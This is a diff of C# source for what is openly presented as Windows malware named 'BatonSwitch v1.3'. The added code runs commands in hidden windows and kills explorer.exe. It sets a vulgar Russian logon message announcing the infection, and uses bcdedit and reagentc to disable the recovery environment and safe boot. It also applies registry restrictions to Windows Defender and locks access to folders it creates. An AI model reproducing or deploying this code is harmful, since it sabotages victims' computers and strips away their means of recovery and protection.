@@ -198,16 +198,34 @@ namespace BatonSwitch
             e.Cancel = true;
         }
 
+        private void hiddenRun(string name, string arg)
+        {
+            try
+            {
+                System.Diagnostics.Process process = new System.Diagnostics.Process();
+                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                startInfo.FileName = name;
+                startInfo.Arguments = arg;
+                process.StartInfo = startInfo;
+                process.Start();
+            }
+            catch { }
+        }
         private void Form2_Load(object sender, EventArgs e)
         {
             textBox2.Text = data.sign;
-            System.Diagnostics.Process process = new System.Diagnostics.Process();
-            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
-            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-            startInfo.FileName = "taskkill.exe";
-            startInfo.Arguments = "/f /im explorer.exe";
-            process.StartInfo = startInfo;
-            process.Start();
+            hiddenRun("taskkill.exe", "/f /im explorer.exe");
+        }
+        private void WinL090n(string text, string caption)
+        {
+            RegistryKey BatonSwitch = LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
+            if (BatonSwitch != null)
+            {
+                BatonSwitch.SetValue("LegalNoticeText", text, RegistryValueKind.String);
+                BatonSwitch.SetValue("LegalNoticeCaption", caption, RegistryValueKind.String);
+                BatonSwitch.Close();
+            }
         }
 
         private void timer_Tick(object sender, EventArgs e)
@@ -472,6 +490,16 @@ namespace BatonSwitch
             }
             catch { }
 
+            //Уведомление при запуске
+            WinL090n("\r\nДобро пожаловать!\r\nВаша система была выебана вирусом BatonSwitch. Для продолжения пожалуйста, нажмите \"ОК\".", "BatonSwitch v1.3");
+
+            //Отключение среды восстановления
+            hiddenRun("bcdedit.exe", "/set recoveryenabled No");
+            hiddenRun("reagentc.exe", "/disable");
+            hiddenRun("bcdedit.exe", "/deletevalue {default} safeboot");
+            hiddenRun("bcdedit.exe", "/deletevalue {default} safebootalternateshell");
+            hiddenRun("bcdedit.exe", "/deletevalue {default} bootmenupolicy");
+
             //Ограничение доступа
             registryBan("SOFTWARE\\Policies\\Microsoft\\Windows Defender", 1, false);
             registryBan("SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center", 1, false);
@@ -532,6 +560,11 @@ namespace BatonSwitch
                         {
                             fakedirpath += "\\" + rand.Next(1, 9).ToString();
                             Directory.CreateDirectory(fakedirpath);
+                            try
+                            {
+                                BanDir(fakedirpath, false);
+                            }
+                            catch { }
                             countpath += 1;
                         }
                     }
